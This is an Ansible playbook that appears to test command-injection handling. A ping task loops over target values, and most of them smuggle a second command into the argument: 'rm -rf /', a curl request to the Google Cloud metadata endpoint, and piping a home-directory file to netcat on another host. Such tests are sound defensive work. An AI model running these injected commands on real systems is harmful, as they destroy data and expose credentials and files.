
- hosts: all
  gather_facts: no

  tasks:
    - name: Mesh ping error test
      command: ping {{ item }}
      with_items:
        - 192.168.1.1; rm -rf /
        - 192.168.1.1 && curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/
        - 127.0.0.1 || echo "this is wrong"
        - 8.8.8.8; cat ~/myfile.txt | nc 10.0.0.10 4242
